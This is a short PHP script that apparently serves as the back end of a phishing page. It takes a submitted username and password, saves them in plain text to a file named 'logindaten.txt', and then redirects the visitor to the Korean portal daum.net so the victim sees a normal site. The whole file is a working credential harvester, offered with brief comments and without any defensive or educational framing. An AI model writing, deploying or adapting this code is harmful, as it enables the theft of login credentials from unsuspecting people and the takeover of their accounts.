<?php
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $username = $_POST['username'];
    $password = $_POST['password'];

    // var for Username + Password
    $text = "Username: $username\nPassword: $password";

    // define the path
    $file_path = 'logindaten.txt';

    // text in directory
    file_put_contents($file_path, $text);

    // connection to different sites
    header('Location: https://www.daum.net');
    exit();
}
?>
